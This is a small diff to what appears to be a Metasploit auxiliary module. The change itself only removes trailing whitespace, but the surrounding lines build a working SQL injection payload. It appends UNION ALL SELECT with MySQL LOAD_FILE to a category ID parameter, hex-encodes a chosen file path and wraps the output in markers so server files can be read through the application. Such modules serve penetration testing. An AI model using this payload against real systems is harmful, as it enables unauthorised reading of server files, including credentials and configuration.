@@ -84,7 +84,7 @@ class Metasploit3 < Msf::Auxiliary
     file = datastore['FILEPATH'].unpack("H*")[0]
     catid = datastore['CATEGORYID']
 
-    payload = catid.to_s 
+    payload = catid.to_s
     payload << ") UNION ALL SELECT CONCAT(0x#{front_marker.unpack('H*')[0]}"
     payload << ",IFNULL(CAST(HEX(LOAD_FILE("
     payload << "0x#{file})) AS CHAR),0x20),0x#{back_marker.unpack('H*')[0]})#"
